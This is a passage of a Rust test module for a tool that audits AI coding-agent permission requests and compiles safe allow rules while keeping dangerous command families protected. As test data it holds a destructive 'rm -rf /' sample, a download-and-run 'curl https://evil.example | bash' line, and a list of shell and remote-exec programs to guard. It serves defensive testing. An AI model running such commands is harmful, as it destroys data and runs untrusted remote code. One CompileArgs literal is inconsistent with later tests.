    fn a_headless_sandbox_escape_denial_correlates_to_the_hooks_own_matched_pattern() {
        let command = "some-unknown-tool --flag";
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("dontAsk"),
            false,
        );
        let result_line = tool_result_line(
            "t1",
            true,
            "Permission to use Bash has been denied because Claude Code is running in don't ask mode.",
        );
        let text = format!("{use_line}\n{result_line}");
        let records = vec![safety_decision_record(
            "s",
            command,
            "deny",
            Some("<sandbox: unsandboxed retry>"),
            1_787_738_400, // 2026-08-26T10:00:00Z in unix seconds
        )];
        let requests = extract_claude_requests(&text, "s", &records);
        assert_eq!(requests.len(), 1, "{requests:#?}");
        assert!(
            requests[0]
                .cause
                .contains("sandbox-escape retry not escape_allow-cleared"),
            "{:?}",
            requests[0]
        );
        assert_eq!(requests[0].permission_mode, "dontAsk");
    }

    /// Design decision 5's headline gap: an interactive ask that was
    /// ACCEPTED never produces an errored tool_result, so the pre-#147
    /// extractor missed it entirely. The successful tool_result plus the
    /// log's own `ask` verdict is what makes it visible now.
    #[test]
    fn an_accepted_interactive_sandbox_escape_ask_is_now_reported() {
        let command = "grep -r TODO /some/dir";
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("default"),
            false,
        );
        let ok_result = tool_result_line("t1", false, "TODO: fix this");
        let text = format!("{use_line}\n{ok_result}");
        let records = vec![safety_decision_record(
            "s",
            command,
            "ask",
            Some("<sandbox: unsandboxed retry>"),
            1_787_738_400,
        )];
        let requests = extract_claude_requests(&text, "s", &records);
        assert_eq!(requests.len(), 1, "{requests:#?}");
        assert_eq!(requests[0].cause, "interactive sandbox-escape ask");
        assert_eq!(requests[0].result, "escalated-accepted");
        assert_eq!(requests[0].permission_mode, "default");
    }

    /// The same ask, but the session ended (or the model moved on) before
    /// any tool_result ever arrived for it -- reported as pending, not
    /// silently dropped.
    #[test]
    fn a_pending_interactive_sandbox_escape_ask_with_no_tool_result_is_reported() {
        let command = "cat /some/log";
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("default"),
            false,
        );
        let records = vec![safety_decision_record(
            "s",
            command,
            "ask",
            Some("<sandbox: unsandboxed retry>"),
            1_787_738_400,
        )];
        let requests = extract_claude_requests(&use_line, "s", &records);
        assert_eq!(requests.len(), 1, "{requests:#?}");
        assert_eq!(requests[0].result, "escalated-pending");
    }

    /// A silent escape allow (built-in or `[safety] escape_allow`) is not
    /// friction an operator needs to see -- it must never surface as a
    /// request at all.
    #[test]
    fn a_silently_allowed_sandbox_escape_produces_no_request() {
        let command = "grep -r TODO /some/dir";
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("default"),
            false,
        );
        let ok_result = tool_result_line("t1", false, "TODO: fix this");
        let text = format!("{use_line}\n{ok_result}");
        let records = vec![safety_decision_record(
            "s",
            command,
            "allow",
            Some("<sandbox: escape_allow>"),
            1_787_738_400,
        )];
        assert!(extract_claude_requests(&text, "s", &records).is_empty());
    }

    /// Outside `CORRELATION_WINDOW_SECS`, a same-hash log entry must be
    /// treated as no match at all -- the pre-#147 fallback wording, not a
    /// wrong-invocation correlation.
    #[test]
    fn a_correlation_outside_the_time_window_falls_back_to_the_generic_cause() {
        let command = "some-unknown-tool --flag";
        let use_line = sandbox_escape_tool_use(
            "t1",
            command,
            "2026-08-26T10:00:00.000Z",
            Some("dontAsk"),
            false,
        );
        let result_line = tool_result_line(
            "t1",
            true,
            "Permission to use Bash has been denied because Claude Code is running in don't ask mode.",
        );
        let text = format!("{use_line}\n{result_line}");
        let records = vec![safety_decision_record(
            "s",
            command,
            "deny",
            Some("<sandbox: unsandboxed retry>"),
            1_787_738_400 - 10_000, // far outside the window
        )];
        let requests = extract_claude_requests(&text, "s", &records);
        assert_eq!(requests.len(), 1, "{requests:#?}");
        assert_eq!(requests[0].cause, "permission-mode dontAsk denial");
    }

    /// `isSidechain`/`permission-mode` event lines are real, verified
    /// transcript shapes (tests/fixtures/claude-real-session.jsonl) --
    /// this pins that both are threaded onto the reported request.
    #[test]
    fn permission_mode_and_sidechain_are_read_from_the_transcript() {
        let mode_line = serde_json::json!({
            "type": "permission-mode",
            "permissionMode": "dontAsk",
            "sessionId": "s"
        })
        .to_string();
        let use_line = serde_json::json!({
            "type": "assistant",
            "isSidechain": true,
            "message": {
                "content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "zirv ctx status"}}]
            }
        })
        .to_string();
        let result_line = serde_json::json!({
            "message": {
                "content": [{
                    "type": "tool_result",
                    "tool_use_id": "t1",
                    "is_error": true,
                    "content": [{"type": "text", "text": "Permission to use Bash has been denied because Claude Code is running in don't ask mode."}]
                }]
            }
        })
        .to_string();
        let text = format!("{mode_line}\n{use_line}\n{result_line}");
        let requests = extract_claude_requests(&text, "s", &[]);
        assert_eq!(requests.len(), 1, "{requests:#?}");
        assert_eq!(requests[0].permission_mode, "dontAsk");
        assert!(requests[0].is_sidechain);
    }

    // -------------------------------------------------------------
    // grouping + report
    // -------------------------------------------------------------

    #[test]
    fn group_requests_sorts_by_count_then_family_and_marks_mixed_reusability() {
        let requests = vec![
            PermissionRequest {
                session: "s".into(),
                raw: "cargo nextest run".into(),
                family: "cargo nextest".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: true,
                permission_mode: String::new(),
                is_sidechain: false,
            },
            PermissionRequest {
                session: "s".into(),
                raw: "gh issue create --body x".into(),
                family: "gh issue".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: true,
                permission_mode: String::new(),
                is_sidechain: false,
            },
            PermissionRequest {
                session: "s".into(),
                raw: "gh issue create --body y".into(),
                family: "gh issue".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: false,
                permission_mode: String::new(),
                is_sidechain: false,
            },
        ];
        let groups = group_requests(&requests);
        assert_eq!(groups[0].family, "gh issue");
        assert_eq!(groups[0].count, 2);
        assert!(!groups[0].reusable, "mixed reusability must fold to false");
        assert_eq!(groups[1].family, "cargo nextest");
        assert_eq!(groups[1].count, 1);
        assert!(groups[1].reusable);
    }

    #[test]
    fn render_report_names_every_group_and_its_recommendation() {
        let report = AuditReport {
            agent: "codex",
            sessions_scanned: 2,
            total_requests: 1,
            groups: vec![FamilyGroup {
                family: "gh issue".into(),
                count: 1,
                reusable: true,
                sample: "gh issue view 1".into(),
                cause: "sandbox_permissions: require_escalated".into(),
                recommendation: "Grant 'gh issue' a standing allow".into(),
                protected: false,
            }],
            requests: Vec::new(),
        };
        let text = render_report(&report, &[]);
        assert!(text.contains("gh issue"));
        assert!(text.contains("reusable"));
        assert!(text.contains("Grant 'gh issue'"));
    }

    #[test]
    fn render_report_says_so_when_nothing_was_found() {
        let report = AuditReport {
            agent: "claude",
            sessions_scanned: 3,
            total_requests: 0,
            groups: vec![],
            requests: Vec::new(),
        };
        assert!(render_report(&report, &[]).contains("No escalated or denied"));
    }

    #[test]
    fn noisy_audit_is_none_below_the_threshold_and_some_above_it() {
        // Below threshold: no transcripts at all -> zero requests.
        assert!(noisy_audit(AuditAgent::Codex, &[]).is_none());
    }

    // -------------------------------------------------------------
    // Regression fixtures (issue #132 acceptance criterion: "Add
    // regression fixtures covering all command shapes listed above and
    // assert that routine approved families stop re-prompting while
    // protected families still prompt.")
    // -------------------------------------------------------------

    const CODEX_FIXTURE: &str =
        include_str!("../../../tests/fixtures/codex-rollout-permission-requests.jsonl");
    const CLAUDE_FIXTURE: &str =
        include_str!("../../../tests/fixtures/claude-transcript-permission-requests.jsonl");

    #[test]
    fn codex_fixture_covers_reusable_and_one_off_command_shapes() {
        let requests = extract_codex_requests(CODEX_FIXTURE, "fixture-session");
        // 11 escalated `exec` requests in the fixture; the successful
        // `custom_tool_call_output` line and the non-`exec` `apply_patch`
        // line must both be skipped.
        assert_eq!(requests.len(), 11, "{requests:#?}");

        let groups = group_requests(&requests);
        let by_family: HashMap<&str, &FamilyGroup> =
            groups.iter().map(|g| (g.family.as_str(), g)).collect();

        // Routine, operator-approvable families: reusable, and NOT flagged
        // protected -- recommendation grants a standing allow.
        assert!(
            by_family["zirv setup apply"].reusable,
            "{:?}",
            by_family["zirv setup apply"]
        );
        assert!(by_family["git fetch"].reusable);
        assert!(by_family["zirv commit"].reusable);
        // The bare invocation (ctc_4) and its `env -u ...`-wrapped twin
        // (ctc_5) must normalize to the SAME family, not two separate
        // one-offs -- the exact gap issue #132 names ("environment-clean
        // wrappers ... were saved as exact invocations rather than the
        // underlying zirv capability").
        assert_eq!(by_family["zirv setup apply"].count, 2);

        // The pipe-into-`jq` requests and the long inline issue body all
        // collapse to the SAME "gh issue" family as the reusable
        // `--body-file` request -- exactly the noise issue #132 reports:
        // one family, mixed reusability, so the group as a whole must not
        // be reported reusable.
        assert_eq!(by_family["gh issue"].count, 4);
        assert!(
            !by_family["gh issue"].reusable,
            "{:?}",
            by_family["gh issue"]
        );

        // ctc_3, the `&&`-chained five-gate validation batch, asserted on
        // its own family and recommendation, not folded into an aggregate
        // count: it normalizes to "cargo build" (the first invocation in
        // the chain), is reusable (no long literal, no filter pipe), and
        // -- being neither destructive/global-write/credential/publish --
        // is recommended a standing allow, not left prompting.
        let cargo_build = by_family["cargo build"];
        assert_eq!(cargo_build.count, 1);
        assert!(cargo_build.reusable, "{cargo_build:?}");
        assert!(
            cargo_build.recommendation.contains("Grant 'cargo build'"),
            "{:?}",
            cargo_build
        );
        assert!(
            !cargo_build.recommendation.contains("protected family"),
            "an ordinary validation batch must not be flagged protected: {:?}",
            cargo_build
        );

        // A global machine-wide install (`choco install ...`) is REUSABLE
        // by `is_reusable`'s own definition (no long literal, no pipe), but
        // must still be recommended `ask`, never a standing allow -- issue
        // #132's "keep global writes ... prompting unless the operator
        // explicitly enables it."
        let choco = by_family["choco"];
        assert!(choco.reusable, "{choco:?}");
        assert!(
            choco.recommendation.contains("protected family"),
            "{:?}",
            choco
        );
        assert!(
            !choco.recommendation.contains("standing allow in"),
            "a protected family must never be told to grant a standing allow: {:?}",
            choco
        );

        // Publish/release: also reusable by the same definition, also must
        // stay protected regardless.
        let publish = by_family["cargo publish"];
        assert!(publish.reusable, "{publish:?}");
        assert!(
            publish.recommendation.contains("protected family"),
            "{:?}",
            publish
        );
    }

    #[test]
    fn codex_fixture_marks_the_long_body_and_jq_pipe_families_not_reusable() {
        let requests = extract_codex_requests(CODEX_FIXTURE, "fixture-session");
        let long_body = requests
            .iter()
            .find(|r| r.raw.contains("much longer inline issue body"))
            .expect("the long-body request");
        assert!(!long_body.reusable, "{long_body:?}");

        let jq_pipe = requests
            .iter()
            .filter(|r| r.raw.contains("| jq"))
            .collect::<Vec<_>>();
        assert_eq!(jq_pipe.len(), 2);
        assert!(jq_pipe.iter().all(|r| !r.reusable), "{jq_pipe:#?}");
    }

    #[test]
    fn claude_fixture_covers_bash_and_non_bash_denials() {
        let requests = extract_claude_requests(CLAUDE_FIXTURE, "fixture-session", &[]);
        // 4 permission denials in the fixture: zirv ctx status, the long-body
        // gh issue create, the Read denial, and the force-push. The
        // successful nextest run and the ordinary (non-permission) failure
        // must both be excluded.
        assert_eq!(requests.len(), 4, "{requests:#?}");

        let by_family: HashMap<&str, &PermissionRequest> =
            requests.iter().map(|r| (r.family.as_str(), r)).collect();
        assert!(by_family["zirv ctx status"].reusable);
        assert!(!by_family["gh issue"].reusable);
        assert!(by_family["Read"].reusable);
        assert_eq!(by_family["git push"].result, "denied");
    }

    /// Force-push is a genuinely dangerous, non-Bash-tool-only concern.
    /// `is_reusable("git push --force origin main")` is TRUE (no long
    /// literal, no filter pipe) -- exactly why reusability alone must never
    /// drive the recommendation: this test proves the "never softened"
    /// claim by actually reading the group's recommendation, not just its
    /// `result`/`reusable` fields, which a reusable-but-protected family
    /// would otherwise pass unnoticed.
    #[test]
    fn claude_fixture_force_push_stays_protected_despite_being_reusable() {
        let requests = extract_claude_requests(CLAUDE_FIXTURE, "fixture-session", &[]);
        let groups = group_requests(&requests);
        let git_push = groups
            .iter()
            .find(|g| g.family == "git push")
            .expect("the force-push group");
        assert!(
            git_push.reusable,
            "sanity: --force has no long literal or pipe, so is_reusable says true: {git_push:?}"
        );
        assert!(
            git_push.recommendation.contains("protected family"),
            "{git_push:?}"
        );
        assert!(
            git_push
                .recommendation
                .contains("stays prompting unless the operator explicitly enables it"),
            "{git_push:?}"
        );
        assert!(
            !git_push.recommendation.contains("standing allow in"),
            "a protected family must never be told to grant a standing allow: {git_push:?}"
        );
    }

    // -------------------------------------------------------------
    // `zirv ctx permissions compile` (issue #132 residual)
    // -------------------------------------------------------------

    fn family_group(family: &str, sample: &str, reusable: bool, protected: bool) -> FamilyGroup {
        FamilyGroup {
            family: family.to_string(),
            count: 1,
            reusable,
            sample: sample.to_string(),
            cause: "sandbox_permissions: require_escalated".to_string(),
            recommendation: String::new(),
            protected,
        }
    }

    #[test]
    fn compile_eligibility_picks_reusable_unprotected_families_only() {
        let groups = vec![
            family_group(
                "gh issue",
                "gh issue create --title x --body-file y",
                true,
                false,
            ),
            family_group(
                "gh issue list",
                "gh issue list --limit 5 | jq .",
                false,
                false,
            ),
        ];
        let (eligible, skipped_protected, skipped_too_generic) = compile_eligibility(&groups);
        assert_eq!(eligible, vec!["gh issue *".to_string()]);
        assert!(
            skipped_protected.is_empty(),
            "the not-reusable group is simply omitted, not reported as protected"
        );
        assert!(skipped_too_generic.is_empty());
    }

    /// The core of design decision 3: a group whose CACHED `protected` field
    /// was doctored to `false` must still be caught, because
    /// `compile_eligibility` re-runs `is_protected_family` independently
    /// rather than trusting the field.
    #[test]
    fn compile_eligibility_never_trusts_a_doctored_protected_field() {
        let doctored = family_group("git push", "git push --force origin main", true, false);
        assert!(
            !doctored.protected,
            "sanity: the field itself claims unprotected"
        );
        let (eligible, skipped_protected, _) = compile_eligibility(&[doctored]);
        assert!(
            eligible.is_empty(),
            "a doctored report must never smuggle a protected family into the eligible set"
        );
        assert_eq!(skipped_protected, vec!["git push".to_string()]);
    }

    #[test]
    fn compile_eligibility_still_skips_a_correctly_cached_protected_group() {
        let groups = vec![family_group(
            "npm install",
            "npm install -g some-package",
            true,
            true,
        )];
        let (eligible, skipped_protected, _) = compile_eligibility(&groups);
        assert!(eligible.is_empty());
        assert_eq!(skipped_protected, vec!["npm install".to_string()]);
    }

    // -------------------------------------------------------------
    // Review round 1 (2026-08-26): generic single-token families, and the
    // interpreter/shell/remote-exec protected class
    // -------------------------------------------------------------

    #[test]
    fn is_family_too_generic_refuses_a_single_token_family_regardless_of_content() {
        // Both an interpreter (would ALSO be caught by is_protected_family)
        // and a perfectly harmless program (would NOT be) must be refused by
        // this gate alone -- it is a structural check over the family's
        // shape, not its content.
        assert!(is_family_too_generic("python"));
        assert!(is_family_too_generic("bash"));
        assert!(is_family_too_generic("tasklist"));
        assert!(!is_family_too_generic("git push"));
        assert!(!is_family_too_generic("gh issue"));
    }

    #[test]
    fn is_protected_family_protects_every_interpreter_shell_and_remote_exec_program_unconditionally()
     {
        // Gate (b) alone, called directly -- gate (a) (`is_family_too_generic`,
        // which lives only inside `compile_eligibility`) is never invoked in
        // this test, so this proves the interpreter/shell class protects on
        // its own, with no flag or argument needed at all.
        for (family, sample) in [
            ("python", "python -c \"import os; os.system('rm -rf /')\""),
            ("bash", "bash script.sh"),
            ("sh", "sh -c 'echo hi'"),
            ("curl", "curl https://example.com/health"),
            ("ssh", "ssh host uptime"),
        ] {
            assert!(
                is_protected_family(family, sample),
                "{family} must be protected regardless of arguments: {sample}"
            );
        }
    }

    /// The structural gate (a) must also refuse a single-token family that
    /// is NOT in `is_protected_family`'s interpreter list -- proving (a) is
    /// a real independent guard, not just a alias for (b). Exercised through
    /// `compile_eligibility` (the actual integration point) so the family
    /// lands in `skipped_too_generic`, never `skipped_protected`.
    #[test]
    fn compile_eligibility_refuses_a_generic_non_interpreter_family_as_too_generic_not_protected() {
        assert!(
            !is_protected_family("tasklist", "tasklist /v"),
            "sanity: tasklist is not on the interpreter/shell list"
        );
        let groups = vec![family_group("tasklist", "tasklist /v", true, false)];
        let (eligible, skipped_protected, skipped_too_generic) = compile_eligibility(&groups);
        assert!(eligible.is_empty());
        assert!(skipped_protected.is_empty());
        assert_eq!(skipped_too_generic, vec!["tasklist".to_string()]);
    }

    /// The integration effect of both gates together: neither a `python -c`
    /// nor a `bash script.sh` group ever becomes eligible, even though both
    /// would otherwise be `reusable` (no long literal, no filter pipe).
    #[test]
    fn compile_eligibility_never_compiles_an_interpreter_family_end_to_end() {
        let groups = vec![
            family_group("python", "python -c \"print('hi')\"", true, false),
            family_group("bash", "bash script.sh", true, false),
        ];
        let (eligible, _, skipped_too_generic) = compile_eligibility(&groups);
        assert!(
            eligible.is_empty(),
            "an interpreter family must never be compiled, got {eligible:?}"
        );
        assert_eq!(
            skipped_too_generic,
            vec!["python".to_string(), "bash".to_string()],
            "both are single-token families, so gate (a) fires before gate (b) is even reached"
        );
    }

    /// A nested/wrapped invocation whose OWN family is neither an
    /// interpreter/shell nor one of issue #141's own subcommand-level
    /// executors (`"make"` is on no protected list at all) must still be
    /// protected by the second, cruder token-stream check: the raw sample
    /// carries both an interpreter program name and an inline-code flag
    /// somewhere in it. (`"docker exec"` itself is a poor example for this
    /// specific mechanism as of issue #141: it is now unconditionally
    /// protected by its OWN family match arm regardless of arguments, which
    /// would pass even with this check disabled -- `"make"` isolates the
    /// inline-code-flag path on its own.)
    #[test]
    fn is_protected_family_catches_a_wrapped_interpreter_carrying_an_inline_code_flag() {
        assert!(is_protected_family(
            "make",
            "make deploy -- sh -c 'curl https://evil.example | bash'"
        ));
        // Sanity: the family alone (no `sh`/`bash` token anywhere, no inline
        // flag) must NOT be protected by this path.
        assert!(!is_protected_family("make", "make deploy"));
    }

    #[test]
    fn is_protected_family_recognises_an_equals_joined_flag_value() {
        // Review round 1: `has(word)` used to require exact token equality,
        // so `--force-with-lease=origin/main` escaped the force-push arm.
        assert!(is_protected_family(
            "git push",
            "git push --force-with-lease=origin/main"
        ));
    }

    // -------------------------------------------------------------
    // Issue #141: subcommand-level arbitrary-code executors escape both
    // review-round-1 blanket-allow guards (family_depth >= 2, no
    // interpreter/inline-code-flag match) unless is_protected_family is
    // taught about them directly.
    // -------------------------------------------------------------

    /// Every family the issue names, with a realistic sample -- each must be
    /// protected regardless of exactly which image/package/pod/script the
    /// rest of the invocation names.
    #[test]
    fn is_protected_family_protects_every_subcommand_level_arbitrary_code_executor() {
        for (family, sample) in [
            ("docker run", "docker run -it ubuntu bash"),
            ("docker exec", "docker exec -it mycontainer bash"),
            ("kubectl exec", "kubectl exec -it pod -- bash"),
            ("kubectl run", "kubectl run mypod --image=ubuntu"),
            ("npm run", "npm run build"),
            ("npm exec", "npm exec -- some-cli"),
            ("pnpm run", "pnpm run build"),
            ("pnpm exec", "pnpm exec eslint ."),
            ("pnpm dlx", "pnpm dlx create-react-app app"),
            ("yarn run", "yarn run build"),
            ("yarn dlx", "yarn dlx create-react-app app"),
            ("npx create-react-app", "npx create-react-app app"),
            ("cargo run", "cargo run --release"),
            ("bunx", "bunx cowsay hi"),
            ("uvx", "uvx black ."),
            ("uv run", "uv run script.py"),
        ] {
            assert!(
                is_protected_family(family, sample),
                "{family} must be protected: {sample}"
            );
        }
    }

    /// `gh api` is conditionally protected: a bare read (implicit GET) is
    /// fine, but a non-GET method or a body-carrying flag mutates whatever
    /// the endpoint controls.
    #[test]
    fn is_protected_family_protects_gh_api_only_when_it_mutates() {
        assert!(
            !is_protected_family("gh api", "gh api repos/foo/bar"),
            "a bare gh api call is an implicit GET and must stay unprotected"
        );
        for mutating_sample in [
            "gh api -X POST repos/foo/bar/issues",
            "gh api --method POST repos/foo/bar/issues",
            "gh api --method=DELETE repos/foo/bar/issues/1",
            "gh api -f title=foo repos/foo/bar/issues",
            "gh api --field title=foo repos/foo/bar/issues",
            "gh api --input body.json repos/foo/bar/issues",
        ] {
            assert!(
                is_protected_family("gh api", mutating_sample),
                "must be protected: {mutating_sample}"
            );
        }
        // Explicit GET, spelled either way, stays unprotected.
        assert!(!is_protected_family(
            "gh api",
            "gh api -X GET repos/foo/bar"
        ));
        assert!(!is_protected_family(
            "gh api",
            "gh api --method=GET repos/foo/bar"
        ));
    }

    /// The narrow read-only siblings named in issue #141 must remain
    /// unprotected -- the fix must not have widened the net past the actual
    /// arbitrary-code-execution subcommands.
    #[test]
    fn is_protected_family_leaves_narrow_read_only_siblings_unprotected() {
        for (family, sample) in [
            ("docker ps", "docker ps -a"),
            ("kubectl get", "kubectl get pods"),
            ("cargo build", "cargo build --release"),
            ("gh api", "gh api repos/foo/bar"),
        ] {
            assert!(
                !is_protected_family(family, sample),
                "{family} must stay unprotected: {sample}"
            );
        }
    }

    /// End-to-end confirmation through `compile_eligibility` (not just the
    /// unit-level `is_protected_family`) for the exact matrix issue #141
    /// asks for: every listed executor family refused, while `docker ps`,
    /// `kubectl get pods`, `cargo build`, and a bare-GET `gh api` remain
    /// eligible.
    #[test]
    fn compile_eligibility_refuses_every_subcommand_exec_family_but_keeps_read_only_siblings() {
        let protected_groups = vec![
            family_group("docker run", "docker run -it ubuntu bash", true, false),
            family_group(
                "docker exec",
                "docker exec -it mycontainer bash",
                true,
                false,
            ),
            family_group("kubectl exec", "kubectl exec -it pod -- bash", true, false),
            family_group(
                "kubectl run",
                "kubectl run mypod --image=ubuntu",
                true,
                false,
            ),
            family_group("npm run", "npm run build", true, false),
            family_group("npm exec", "npm exec -- some-cli", true, false),
            family_group("pnpm run", "pnpm run build", true, false),
            family_group("pnpm exec", "pnpm exec eslint .", true, false),
            family_group("pnpm dlx", "pnpm dlx create-react-app app", true, false),
            family_group("yarn run", "yarn run build", true, false),
            family_group("yarn dlx", "yarn dlx create-react-app app", true, false),
            family_group(
                "npx create-react-app",
                "npx create-react-app app",
                true,
                false,
            ),
            family_group("cargo run", "cargo run --release", true, false),
            family_group("bunx", "bunx cowsay hi", true, false),
            family_group("uvx", "uvx black .", true, false),
            family_group("uv run", "uv run script.py", true, false),
            family_group("gh api", "gh api -X POST repos/foo/bar/issues", true, false),
        ];
        let (eligible, skipped_protected, skipped_too_generic) =
            compile_eligibility(&protected_groups);
        assert!(
            eligible.is_empty(),
            "none of these arbitrary-code executors may compile: {eligible:?}"
        );
        // `bunx`/`uvx` are single-token families (neither is in
        // `family_depth`'s two-token map, unlike `npx`), so gate (a)
        // (`is_family_too_generic`) refuses them before `compile_eligibility`
        // ever reaches the protected check -- they still end up refused,
        // just filed under `skipped_too_generic` rather than
        // `skipped_protected`. Every OTHER family here is >= 2 tokens, so
        // only `is_protected_family`'s new subcommand-level match arms (or,
        // for `npx`, the whole-family first-token check) are what refuse
        // them.
        assert_eq!(
            skipped_protected.len() + skipped_too_generic.len(),
            protected_groups.len(),
            "every family above must be refused one way or the other: \
             skipped_protected={skipped_protected:?}, skipped_too_generic={skipped_too_generic:?}"
        );
        assert_eq!(
            skipped_too_generic,
            vec!["bunx".to_string(), "uvx".to_string()],
            "only the single-token families should land here"
        );

        let eligible_groups = vec![
            family_group("docker ps", "docker ps -a", true, false),
            family_group("kubectl get", "kubectl get pods", true, false),
            family_group("cargo build", "cargo build --release", true, false),
            family_group("gh api", "gh api repos/foo/bar", true, false),
        ];
        let (eligible, skipped_protected, skipped_too_generic) =
            compile_eligibility(&eligible_groups);
        assert_eq!(
            eligible,
            vec![
                "docker ps *".to_string(),
                "kubectl get *".to_string(),
                "cargo build *".to_string(),
                "gh api *".to_string(),
            ]
        );
        assert!(skipped_protected.is_empty());
        assert!(skipped_too_generic.is_empty());
    }

    /// Design decision 4: the pattern `run_compile` derives and writes must
    /// actually match the next equivalent invocation, not just the one
    /// sample command in the report. Verified end to end: compile a group
    /// into a temp home's `~/.zirv/ctx.toml`, resolve the real `[safety]`
    /// policy from that file exactly the way a launch would, and evaluate a
    /// DIFFERENT command in the same family (a fresh commit + a different
    /// title, not the literal sample string) against it.
    #[test]
    fn a_compiled_pattern_matches_the_next_equivalent_command_under_the_resolved_policy() {
        let group = family_group(
            "gh issue",
            "gh issue create --title x --body-file /tmp/body.md",
            true,
            false,
        );
        let (eligible, _, _) = compile_eligibility(&[group]);
        assert_eq!(eligible, vec!["gh issue *".to_string()]);

        let home = tempfile::tempdir().expect("home");
        crate::commands::setup::union_home_safety_allow(home.path(), &eligible).expect("write");

        let path = home.path().join(".zirv/ctx.toml");
        let root: toml::Table =
            toml::from_str(&std::fs::read_to_string(&path).expect("read")).expect("parse");
        let safety_value = root.get("safety").cloned();

        let empty: HashMap<String, String> = HashMap::new();
        let policy = super::super::safety::resolve(safety_value, None, &|k| empty.get(k).cloned())
            .expect("resolve");

        let outcome = super::super::safety::evaluate(
            &policy,
            "gh issue edit 99 --add-label bug",
            super::super::adapters::LaunchMode::Headless,
        );
        assert_eq!(
            outcome.verdict,
            super::super::safety::Verdict::Allow,
            "the compiled pattern must match a DIFFERENT gh issue invocation, not just the \
             original sample: {outcome:?}"
        );
    }

    /// Writes one codex rollout fixture under `<home>/.codex/sessions/` --
    /// exactly where `transcripts_root(AuditAgent::Codex)` looks -- so a
    /// `HomeGuard`-scoped `run_compile` call reads it for real. Review round
    /// 1 (2026-08-26): the two tests below used to claim this was not
    /// possible ("not overridable here without a real ~/.codex/sessions")
    /// and drove the writer path manually instead of through `run_compile`
    /// itself -- wrong, since `crate::utils::home_dir()` (what
    /// `transcripts_root` and `run_compile`'s own write path both resolve
    /// through) is exactly what `HomeGuard` redirects, the same seam every
    /// other `HomeGuard`-scoped test in this codebase already relies on.
    fn write_codex_rollout_fixture(home: &Path, command: &str) {
        let sessions_dir = home.join(".codex").join("sessions");
        std::fs::create_dir_all(&sessions_dir).expect("mkdir sessions");
        std::fs::write(
            sessions_dir.join("s1.jsonl"),
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "sandbox_permissions": "require_escalated",
                    "command": command
                }
            })
            .to_string(),
        )
        .expect("write fixture");
    }

    /// Issue "codex approval hell" (2026-08-26): compiled `[safety] allow`
    /// entries never change codex's own launch posture (codex has no
    /// per-command hook zirv can pin), so both audit verbs must say so for a
    /// codex run -- including via the default agent -- and must not print
    /// the same caveat for a claude run, where the compiled entries DO
    /// change what the `PreToolUse` hook allows.
    #[test]
    fn run_audit_prints_the_codex_safety_no_op_caveat_only_for_codex() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(home.path(), "gh issue create --title x");

        let codex_args = AuditArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            json: false,
        };
        let mut out = Vec::new();
        run_audit(&codex_args, &mut out).expect("run_audit");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "codex audit must print the no-op caveat: {text}"
        );

        let claude_args = AuditArgs {
            agent: AuditAgent::Claude,
            sessions: 5,
            json: false,
        };
        let mut out = Vec::new();
        run_audit(&claude_args, &mut out).expect("run_audit");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "claude audit must not print codex's no-op caveat: {text}"
        );
    }

    /// The default `--agent` value is codex (`AuditArgs`/`CompileArgs`'s own
    /// `default_value = "codex"`), so a caller who never passes `--agent` at
    /// all must still see the caveat.
    #[test]
    fn run_compile_prints_the_codex_safety_no_op_caveat_by_default() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(home.path(), "gh issue create --title x");

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: true,
        };
        let mut out = Vec::new();
        run_compile(&args, &mut out).expect("run_compile");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(CODEX_SAFETY_NO_OP_CAVEAT),
            "compile with the default (codex) agent must print the no-op caveat: {text}"
        );
    }

    #[test]
    fn run_compile_dry_run_writes_nothing_end_to_end() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(
            home.path(),
            "gh issue create --title x --body-file /tmp/body.md",
        );

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: true,
            escape: false,
        };
        let mut out = Vec::new();
        let code = run_compile(&args, &mut out).expect("run_compile");
        assert_eq!(code, 0);
        let text = String::from_utf8(out).expect("utf8");

        assert!(text.contains("(dry run)"), "got {text}");
        assert!(text.contains("gh issue *"), "got {text}");
        assert!(
            !home.path().join(".zirv/ctx.toml").exists(),
            "a dry run must not create ~/.zirv/ctx.toml: {text}"
        );
    }

    #[test]
    fn run_compile_writes_end_to_end_and_backs_up_the_pre_write_file() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        write_codex_rollout_fixture(
            home.path(),
            "gh issue create --title x --body-file /tmp/body.md",
        );

        // A pre-existing file with an unrelated entry, so this test also
        // proves the union (not clobbered) and the `.bak` backup end to end.
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        let ctx_toml = home.path().join(".zirv/ctx.toml");
        std::fs::write(&ctx_toml, "[safety]\nallow = [\"cargo nextest *\"]\n").expect("seed");

        let args = CompileArgs {
            agent: AuditAgent::Codex,
            sessions: 5,
            dry_run: false,
            escape: false,
        };
        let mut out = Vec::new();
        let code = run_compile(&args, &mut out).expect("run_compile");
        assert_eq!(code, 0);
        let text = String::from_utf8(out).expect("utf8");

